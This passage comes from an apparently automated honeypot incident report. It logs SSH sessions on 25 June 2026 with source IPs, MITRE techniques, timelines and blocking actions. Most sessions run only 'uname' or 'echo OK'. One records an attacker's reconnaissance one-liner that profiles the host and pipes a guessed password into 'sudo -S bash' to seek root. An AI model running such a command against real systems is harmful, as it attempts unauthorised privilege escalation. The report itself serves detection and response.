| `2026-06-25 17:58:10` | `cowrie.command.input` |
| `2026-06-25 17:58:10` | `cowrie.log.closed` |
| `2026-06-25 17:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32bff1e0b09b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:59 |
| **Last Seen** | 2026-06-25 17:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:59:12` | `cowrie.session.connect` |
| `2026-06-25 17:59:12` | `cowrie.client.version` |
| `2026-06-25 17:59:12` | `cowrie.client.kex` |
| `2026-06-25 17:59:13` | `cowrie.login.success` |
| `2026-06-25 17:59:14` | `cowrie.session.params` |
| `2026-06-25 17:59:14` | `cowrie.command.input` |
| `2026-06-25 17:59:14` | `cowrie.log.closed` |
| `2026-06-25 17:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7365e3373143

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-25 17:59 |
| **Last Seen** | 2026-06-25 17:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1, echo '!root' | sudo -S bash -c 'm=0; while read k v r; do [ "$k" = MemTotal: ] && { m=$v; break; }; done < /proc/meminfo 2>/dev/null; [ "$m" -gt 1048576 ] 2>/dev/null && echo 1 || echo 0' || bash -c 'm=0; while read k v r; do [ "$k" = MemTotal: ] && { m=$v; break; }; done < /proc/meminfo 2>/dev/null; [ "$m" -gt 1048576 ] 2>/dev/null && echo 1 || echo 0'` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:59:37` | `cowrie.session.connect` |
| `2026-06-25 17:59:38` | `cowrie.client.version` |
| `2026-06-25 17:59:39` | `cowrie.client.kex` |
| `2026-06-25 17:59:41` | `cowrie.login.success` |
| `2026-06-25 17:59:42` | `cowrie.session.params` |
| `2026-06-25 17:59:42` | `cowrie.command.input` |
| `2026-06-25 17:59:42` | `cowrie.command.input` |
| `2026-06-25 17:59:42` | `cowrie.command.input` |
| `2026-06-25 17:59:42` | `cowrie.command.input` |
| `2026-06-25 17:59:42` | `cowrie.log.closed` |
| `2026-06-25 17:59:44` | `cowrie.session.params` |
| `2026-06-25 17:59:44` | `cowrie.command.input` |
| `2026-06-25 17:59:44` | `cowrie.command.input` |
| `2026-06-25 17:59:44` | `cowrie.command.failed` |
| `2026-06-25 17:59:44` | `cowrie.command.failed` |
| `2026-06-25 17:59:44` | `cowrie.command.failed` |
| `2026-06-25 17:59:44` | `cowrie.command.failed` |
| `2026-06-25 17:59:45` | `cowrie.log.closed` |
| `2026-06-25 17:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a02971e4358

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:00 |
| **Last Seen** | 2026-06-25 18:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:00:15` | `cowrie.session.connect` |
| `2026-06-25 18:00:15` | `cowrie.client.version` |
| `2026-06-25 18:00:15` | `cowrie.client.kex` |
| `2026-06-25 18:00:16` | `cowrie.login.success` |
| `2026-06-25 18:00:16` | `cowrie.session.params` |
| `2026-06-25 18:00:16` | `cowrie.command.input` |
| `2026-06-25 18:00:17` | `cowrie.log.closed` |
| `2026-06-25 18:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59437fd7f199

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:00 |
| **Last Seen** | 2026-06-25 18:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:00:57` | `cowrie.session.connect` |
| `2026-06-25 18:00:57` | `cowrie.client.version` |
| `2026-06-25 18:00:57` | `cowrie.client.kex` |
| `2026-06-25 18:00:57` | `cowrie.login.success` |
| `2026-06-25 18:00:58` | `cowrie.session.params` |
| `2026-06-25 18:00:58` | `cowrie.command.input` |
| `2026-06-25 18:00:58` | `cowrie.log.closed` |
| `2026-06-25 18:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a68078aac308

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:01 |
| **Last Seen** | 2026-06-25 18:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:01:39` | `cowrie.session.connect` |
| `2026-06-25 18:01:39` | `cowrie.client.version` |
| `2026-06-25 18:01:39` | `cowrie.client.kex` |
| `2026-06-25 18:01:39` | `cowrie.login.success` |
| `2026-06-25 18:01:40` | `cowrie.session.params` |
| `2026-06-25 18:01:40` | `cowrie.command.input` |
| `2026-06-25 18:01:40` | `cowrie.log.closed` |
| `2026-06-25 18:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b371c4651924

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:02 |
| **Last Seen** | 2026-06-25 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:02:22` | `cowrie.session.connect` |
| `2026-06-25 18:02:22` | `cowrie.client.version` |
| `2026-06-25 18:02:22` | `cowrie.client.kex` |
| `2026-06-25 18:02:22` | `cowrie.login.success` |
| `2026-06-25 18:02:23` | `cowrie.session.params` |
| `2026-06-25 18:02:23` | `cowrie.command.input` |
| `2026-06-25 18:02:23` | `cowrie.log.closed` |
| `2026-06-25 18:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1919390a1119

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:03 |
| **Last Seen** | 2026-06-25 18:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:03:05` | `cowrie.session.connect` |
| `2026-06-25 18:03:05` | `cowrie.client.version` |
| `2026-06-25 18:03:05` | `cowrie.client.kex` |
| `2026-06-25 18:03:05` | `cowrie.login.success` |
| `2026-06-25 18:03:06` | `cowrie.session.params` |
| `2026-06-25 18:03:06` | `cowrie.command.input` |
| `2026-06-25 18:03:06` | `cowrie.log.closed` |
| `2026-06-25 18:03:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aca97ebb8520

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:03 |
| **Last Seen** | 2026-06-25 18:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:03:48` | `cowrie.session.connect` |
| `2026-06-25 18:03:48` | `cowrie.client.version` |
| `2026-06-25 18:03:48` | `cowrie.client.kex` |
| `2026-06-25 18:03:48` | `cowrie.login.success` |
| `2026-06-25 18:03:49` | `cowrie.session.params` |
| `2026-06-25 18:03:49` | `cowrie.command.input` |
| `2026-06-25 18:03:49` | `cowrie.log.closed` |
| `2026-06-25 18:03:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ec70166ec4c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:04 |
| **Last Seen** | 2026-06-25 18:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:04:31` | `cowrie.session.connect` |
| `2026-06-25 18:04:31` | `cowrie.client.version` |
| `2026-06-25 18:04:31` | `cowrie.client.kex` |
| `2026-06-25 18:04:31` | `cowrie.login.success` |
| `2026-06-25 18:04:32` | `cowrie.session.params` |
| `2026-06-25 18:04:32` | `cowrie.command.input` |
| `2026-06-25 18:04:32` | `cowrie.log.closed` |
| `2026-06-25 18:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a605d4636112

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:05 |
| **Last Seen** | 2026-06-25 18:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:05:13` | `cowrie.session.connect` |
| `2026-06-25 18:05:13` | `cowrie.client.version` |
| `2026-06-25 18:05:13` | `cowrie.client.kex` |
| `2026-06-25 18:05:14` | `cowrie.login.success` |
| `2026-06-25 18:05:15` | `cowrie.session.params` |
| `2026-06-25 18:05:15` | `cowrie.command.input` |
| `2026-06-25 18:05:15` | `cowrie.log.closed` |
| `2026-06-25 18:05:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-494b4beb99ae

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:05 |
| **Last Seen** | 2026-06-25 18:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:05:56` | `cowrie.session.connect` |
| `2026-06-25 18:05:56` | `cowrie.client.version` |
| `2026-06-25 18:05:56` | `cowrie.client.kex` |
| `2026-06-25 18:05:56` | `cowrie.login.success` |
| `2026-06-25 18:05:57` | `cowrie.session.params` |
| `2026-06-25 18:05:57` | `cowrie.command.input` |
| `2026-06-25 18:05:57` | `cowrie.log.closed` |
| `2026-06-25 18:05:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c648a8e66e2

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 18:06 |
| **Last Seen** | 2026-06-25 18:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:06:10` | `cowrie.session.connect` |
| `2026-06-25 18:06:11` | `cowrie.client.version` |
| `2026-06-25 18:06:11` | `cowrie.client.kex` |
| `2026-06-25 18:06:12` | `cowrie.login.success` |
| `2026-06-25 18:06:14` | `cowrie.session.params` |
| `2026-06-25 18:06:14` | `cowrie.command.input` |
| `2026-06-25 18:06:14` | `cowrie.log.closed` |
| `2026-06-25 18:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65a2c3912e26

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:06 |
| **Last Seen** | 2026-06-25 18:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:06:39` | `cowrie.session.connect` |
| `2026-06-25 18:06:39` | `cowrie.client.version` |
| `2026-06-25 18:06:39` | `cowrie.client.kex` |
| `2026-06-25 18:06:39` | `cowrie.login.success` |
| `2026-06-25 18:06:40` | `cowrie.session.params` |
| `2026-06-25 18:06:40` | `cowrie.command.input` |
| `2026-06-25 18:06:40` | `cowrie.log.closed` |
| `2026-06-25 18:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8d8e10b331f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:07 |
| **Last Seen** | 2026-06-25 18:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:07:22` | `cowrie.session.connect` |
| `2026-06-25 18:07:22` | `cowrie.client.version` |
| `2026-06-25 18:07:22` | `cowrie.client.kex` |
| `2026-06-25 18:07:22` | `cowrie.login.success` |
| `2026-06-25 18:07:23` | `cowrie.session.params` |
| `2026-06-25 18:07:23` | `cowrie.command.input` |
| `2026-06-25 18:07:23` | `cowrie.log.closed` |
| `2026-06-25 18:07:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b98631acfb90

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:08 |
| **Last Seen** | 2026-06-25 18:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:08:05` | `cowrie.session.connect` |
| `2026-06-25 18:08:05` | `cowrie.client.version` |
| `2026-06-25 18:08:06` | `cowrie.client.kex` |
| `2026-06-25 18:08:06` | `cowrie.login.success` |
| `2026-06-25 18:08:07` | `cowrie.session.params` |
| `2026-06-25 18:08:07` | `cowrie.command.input` |
| `2026-06-25 18:08:07` | `cowrie.log.closed` |
| `2026-06-25 18:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10d454f0ed26

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:08 |
| **Last Seen** | 2026-06-25 18:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:08:50` | `cowrie.session.connect` |
| `2026-06-25 18:08:50` | `cowrie.client.version` |
| `2026-06-25 18:08:51` | `cowrie.client.kex` |
| `2026-06-25 18:08:51` | `cowrie.login.success` |
| `2026-06-25 18:08:52` | `cowrie.session.params` |
| `2026-06-25 18:08:52` | `cowrie.command.input` |
| `2026-06-25 18:08:52` | `cowrie.log.closed` |
| `2026-06-25 18:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b36d4cfb3c3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 18:09 |
| **Last Seen** | 2026-06-25 18:09 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:09:34` | `cowrie.session.connect` |
| `2026-06-25 18:09:35` | `cowrie.client.version` |
| `2026-06-25 18:09:35` | `cowrie.client.kex` |
| `2026-06-25 18:09:41` | `cowrie.login.success` |
| `2026-06-25 18:09:44` | `cowrie.session.params` |
| `2026-06-25 18:09:44` | `cowrie.command.input` |
| `2026-06-25 18:09:46` | `cowrie.log.closed` |
| `2026-06-25 18:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39ca7a0324e3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:09 |
| **Last Seen** | 2026-06-25 18:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:09:36` | `cowrie.session.connect` |
| `2026-06-25 18:09:36` | `cowrie.client.version` |
| `2026-06-25 18:09:36` | `cowrie.client.kex` |
| `2026-06-25 18:09:37` | `cowrie.login.success` |
| `2026-06-25 18:09:37` | `cowrie.session.params` |
| `2026-06-25 18:09:37` | `cowrie.command.input` |
| `2026-06-25 18:09:38` | `cowrie.log.closed` |
| `2026-06-25 18:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dba0f5c5a83c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:10 |
| **Last Seen** | 2026-06-25 18:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:10:22` | `cowrie.session.connect` |
| `2026-06-25 18:10:22` | `cowrie.client.version` |
| `2026-06-25 18:10:22` | `cowrie.client.kex` |
| `2026-06-25 18:10:22` | `cowrie.login.success` |
| `2026-06-25 18:10:23` | `cowrie.session.params` |
| `2026-06-25 18:10:23` | `cowrie.command.input` |
| `2026-06-25 18:10:23` | `cowrie.log.closed` |
| `2026-06-25 18:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd83777e2d73

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:11 |
| **Last Seen** | 2026-06-25 18:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:11:07` | `cowrie.session.connect` |
| `2026-06-25 18:11:07` | `cowrie.client.version` |
| `2026-06-25 18:11:07` | `cowrie.client.kex` |
| `2026-06-25 18:11:07` | `cowrie.login.success` |
| `2026-06-25 18:11:08` | `cowrie.session.params` |
| `2026-06-25 18:11:08` | `cowrie.command.input` |
| `2026-06-25 18:11:08` | `cowrie.log.closed` |
| `2026-06-25 18:11:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c52ec34f2ec3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:11 |
| **Last Seen** | 2026-06-25 18:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:11:51` | `cowrie.session.connect` |
| `2026-06-25 18:11:51` | `cowrie.client.version` |
| `2026-06-25 18:11:51` | `cowrie.client.kex` |
| `2026-06-25 18:11:52` | `cowrie.login.success` |
| `2026-06-25 18:11:53` | `cowrie.session.params` |
| `2026-06-25 18:11:53` | `cowrie.command.input` |
| `2026-06-25 18:11:53` | `cowrie.log.closed` |
| `2026-06-25 18:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df11583efbfd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:12 |
| **Last Seen** | 2026-06-25 18:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:12:36` | `cowrie.session.connect` |
| `2026-06-25 18:12:36` | `cowrie.client.version` |
| `2026-06-25 18:12:36` | `cowrie.client.kex` |
| `2026-06-25 18:12:36` | `cowrie.login.success` |
| `2026-06-25 18:12:37` | `cowrie.session.params` |
| `2026-06-25 18:12:37` | `cowrie.command.input` |
| `2026-06-25 18:12:37` | `cowrie.log.closed` |
| `2026-06-25 18:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f75e43358525

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:13 |
| **Last Seen** | 2026-06-25 18:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:13:20` | `cowrie.session.connect` |
| `2026-06-25 18:13:20` | `cowrie.client.version` |
| `2026-06-25 18:13:20` | `cowrie.client.kex` |
| `2026-06-25 18:13:20` | `cowrie.login.success` |
| `2026-06-25 18:13:21` | `cowrie.session.params` |
| `2026-06-25 18:13:21` | `cowrie.command.input` |
| `2026-06-25 18:13:21` | `cowrie.log.closed` |
| `2026-06-25 18:13:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-659d954485f2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:14 |
| **Last Seen** | 2026-06-25 18:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:14:03` | `cowrie.session.connect` |
| `2026-06-25 18:14:03` | `cowrie.client.version` |
| `2026-06-25 18:14:03` | `cowrie.client.kex` |
| `2026-06-25 18:14:03` | `cowrie.login.success` |
| `2026-06-25 18:14:04` | `cowrie.session.params` |
| `2026-06-25 18:14:04` | `cowrie.command.input` |
| `2026-06-25 18:14:04` | `cowrie.log.closed` |
| `2026-06-25 18:14:04` | `cowrie.session.closed` |

**Recommended Actions:**
